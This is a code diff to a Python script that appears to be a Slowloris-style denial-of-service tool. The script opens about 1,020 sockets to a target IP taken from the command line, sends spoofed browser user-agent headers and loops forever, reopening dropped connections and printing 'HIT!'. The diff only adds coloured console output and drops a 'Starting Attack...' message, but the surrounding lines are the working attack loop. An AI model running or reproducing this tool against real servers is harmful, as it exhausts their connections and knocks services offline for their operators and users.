@@ -1,6 +1,7 @@
 #!/usr/bin/env python
 
-import socket, random, time, sys
+import socket, random, time, sys, colorama
+from colorama import Fore
 
 headers = [
     "User-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
@@ -22,12 +23,11 @@ def setupSocket(ip):
 
 if __name__ == "__main__":
     if len(sys.argv) != 2:
-        print("Unknown Error")
+        print(Fore.RED+"Unknown Error"+Fore.WHITE)
         sys.exit()
 
     ip = sys.argv[1]
     count = 1020
-    print("Starting Attack...")
 
     for _ in range(count):
         try:
@@ -39,7 +39,7 @@ if __name__ == "__main__":
         sockets.append(sock)
 
     while True:
-        print("Connected {} sockets".format(len(sockets)))
+        print(Fore.GREEN+"Connected {} sockets".format(len(sockets)))
 
         for sock in list(sockets):
             try:
@@ -48,7 +48,7 @@ if __name__ == "__main__":
                 sockets.remove(sock)
 
         for _ in range(count - len(sockets)):
-            print("HIT!")
+            print(Fore.YELLOW+"HIT!"+Fore.WHITE)
             try:
                 sock = setupSocket(ip)
                 if sock:
